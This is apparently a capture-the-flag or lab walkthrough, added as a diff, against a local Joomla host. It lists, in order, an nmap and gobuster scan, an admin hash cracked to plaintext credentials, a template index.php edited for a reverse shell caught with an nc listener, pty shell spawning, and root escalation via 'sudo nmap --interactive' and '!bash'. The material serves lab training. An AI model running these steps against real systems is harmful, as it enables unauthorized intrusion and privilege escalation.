@@ -1,0 +1,60 @@
+192.168.1.12 ubuntu
+
+
+**nmap scan ports**
+nmap -sV -sC 192.168.1.12
+
+
+**gobuster to search for hidden web objects** 
+
+./gobuster.sh http://192.168.1.12/
+./gobuster.sh http://192.168.1.12/joomla
+http://192.168.1.12/joomla/administrator
+
+
+**admin portal **
+http://192.168.1.12/joomla/administrator/
+
+
+
+**crack the hash**
+192.168.1.12/joomla/password
+
+https://crackstation.net/
+
+
+admin
+godhelpmeplz
+
+
+**access index.php** 
+http://192.168.1.12/joomla/templates/protostar/index.php
+
+**set up nc in listening mode **
+nc -lvnp 1234
+
+
+
+**spawn bash shell**
+ python -c "import pty;pty.spawn('/bin/bash')"
+
+ctrl-z
+
+stty raw -echo
+fg
+
+
+**check the privilege of www-data**
+sudo -l 
+
+
+**check nmap version **
+nmap --version
+
+
+**take advantage of interactive mode of nmap***
+sudo nmap --interactive
+!bash
+
+
+
